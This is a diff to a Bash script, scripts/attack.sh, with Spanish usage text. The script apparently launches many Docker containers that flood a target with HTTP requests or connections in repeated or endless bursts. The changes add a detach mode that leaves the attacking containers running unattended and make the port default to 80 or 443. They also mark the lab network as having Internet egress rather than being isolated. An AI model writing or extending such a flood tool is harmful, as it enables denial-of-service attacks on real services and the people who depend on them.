@@ -24,6 +24,7 @@ PRESET=""
 DRY_RUN=0
 USE_LAN=0
 HTTPS=0
+DETACH=0
 DNS_SERVER=""
 declare -a RESOLVE_MAP=()
 
@@ -32,7 +33,7 @@ usage() {
 uso: scripts/attack.sh --dns HOST --port PUERTO [opciones]
 
   --dns HOST         nombre DNS (o IP) del destino            [obligatorio]
-  --port PUERTO      puerto del destino                        [obligatorio]
+  --port PUERTO      puerto del destino (def. 80, o 443 con --https)
   --requests N       peticiones por rafaga y contenedor        (def. 50)
   --every S          segundos entre rafagas                    (def. 1)
   --forever          no termina hasta Ctrl+C
@@ -46,6 +47,7 @@ uso: scripts/attack.sh --dns HOST --port PUERTO [opciones]
   --dns-server IP    servidor DNS que usan los contenedores
   --resolve N=IP     fija el nombre N a la IP indicada (repetible)
   --dry-run          muestra el plan sin lanzar nada
+  --detach           lanza y sale; los contenedores siguen en segundo plano
 
 ejemplos:
   scripts/attack.sh --dns victima.local --port 8000 --requests 100 --every 1 --forever
@@ -82,6 +84,7 @@ while [[ $# -gt 0 ]]; do
     --https)        HTTPS=1; shift ;;
     --http)         HTTPS=0; shift ;;
     --dry-run)      DRY_RUN=1; shift ;;
+    --detach)       DETACH=1; shift ;;
     -h|--help)      usage; exit 0 ;;
     *) echo "opcion desconocida: $1" >&2; usage; exit 1 ;;
   esac
@@ -95,8 +98,8 @@ case "$PRESET" in
   *) echo "preset invalido: $PRESET (light|medium|hard)" >&2; exit 1 ;;
 esac
 
-if [[ -z "$HOST" || -z "$PORT" ]]; then
-  echo "faltan --dns y --port" >&2
+if [[ -z "$HOST" ]]; then
+  echo "falta --dns" >&2
   usage
   exit 1
 fi
@@ -107,6 +110,11 @@ if [[ "$HOST" == *:* ]]; then
   HOST_PORT="${HOST##*:}"
   HOST="$HOST_ONLY"
   [[ "$HOST_PORT" =~ ^[0-9]+$ ]] && PORT="$HOST_PORT"
+fi
+
+# Puerto por defecto si no se indico ni en --port ni en "host:puerto".
+if [[ -z "$PORT" ]]; then
+  PORT=$(( HTTPS ? 443 : 80 ))
 fi
 
 case "$VECTOR" in
@@ -175,13 +183,17 @@ UNITS="$REQUESTS peticiones"
 [[ "$VECTOR" == "conn" ]] && UNITS="$REQUESTS conexiones"
 
 echo "=============================================================="
-echo "  DESTINO     : $HOST:$PORT$ATTACK_PATH"
+if [[ "$PORT" == "80" || "$PORT" == "443" ]]; then
+  echo "  DESTINO     : $HOST$ATTACK_PATH"
+else
+  echo "  DESTINO     : $HOST:$PORT$ATTACK_PATH"
+fi
 echo "  PROTOCOLO   : $([[ $HTTPS -eq 1 ]] && echo HTTPS || echo HTTP)"
 echo "  PATRON      : $UNITS cada ${EVERY}s por contenedor"
 echo "  MODO        : $([[ $FOREVER -eq 1 ]] && echo 'INFINITO (Ctrl+C)' || echo "${DURATION}s")"
 echo "  CONTENEDORES: $CONTAINERS"
 echo "  VECTOR      : $VECTOR"
-echo "  RED         : $([[ $USE_LAN -eq 1 ]] && echo 'lab + LAN' || echo 'solo lab (aislada)')"
+echo "  RED         : $([[ $USE_LAN -eq 1 ]] && echo 'lab + LAN' || echo 'lab (salida a Internet)')"
 if [[ -n "$DNS_SERVER" ]]; then
   echo "  DNS SERVER  : $DNS_SERVER"
 fi
@@ -236,8 +248,10 @@ on_signal() {
   cleanup
   wait 2>/dev/null || true
 }
-trap on_signal INT TERM
-trap cleanup EXIT
+if (( ! DETACH )); then
+  trap on_signal INT TERM
+  trap cleanup EXIT
+fi
 
 args_for() {
   local vec="$1"
@@ -278,17 +292,31 @@ for ((i = 0; i < CONTAINERS; i++)); do
     continue
   fi
   CIDS+=("$CID")
-  (
-    docker logs -f "$CID" 2>&1 \
-      | sed -u "s/^/[w${i}] /" \
-      | tee "$LOG_DIR/w${i}.log"
-  ) &
-  PIDS+=("$!")
+  if (( ! DETACH )); then
+    (
+      docker logs -f "$CID" 2>&1 \
+        | sed -u "s/^/[w${i}] /" \
+        | tee "$LOG_DIR/w${i}.log"
+    ) &
+    PIDS+=("$!")
+  fi
 done
 
 if (( ${#CIDS[@]} == 0 )); then
   echo "[!] no se lanzo ningun contenedor" >&2
   exit 1
+fi
+
+if (( DETACH )); then
+  [[ -n "${OVERRIDE_DIR:-}" ]] && rm -rf "$OVERRIDE_DIR"
+  echo
+  echo "[*] $CONTAINERS contenedor(es) en segundo plano (detach):"
+  for i in "${!CIDS[@]}"; do
+    echo "    ${NAMES[$i]}  ·  ${CIDS[$i]}"
+  done
+  echo "[*] ver logs:  docker logs -f ${NAMES[*]}"
+  echo "[*] detener:   docker rm -f ${NAMES[*]}"
+  exit 0
 fi
 
 echo "[*] en marcha. Ctrl+C para parar."
@@ -327,7 +355,8 @@ for i in range(n):
 print("\n" + "=" * 66)
 print("  RESUMEN")
 print("=" * 66)
-print(f"  destino       : {host}:{port}{path}")
+port_suffix = "" if port in ("80", "443") else f":{port}"
+print(f"  destino       : {host}{port_suffix}{path}")
 print(f"  contenedores  : {n}")
 
 http = [w for w in workers if w["result"] and w["result"].get("kind") == "http"]
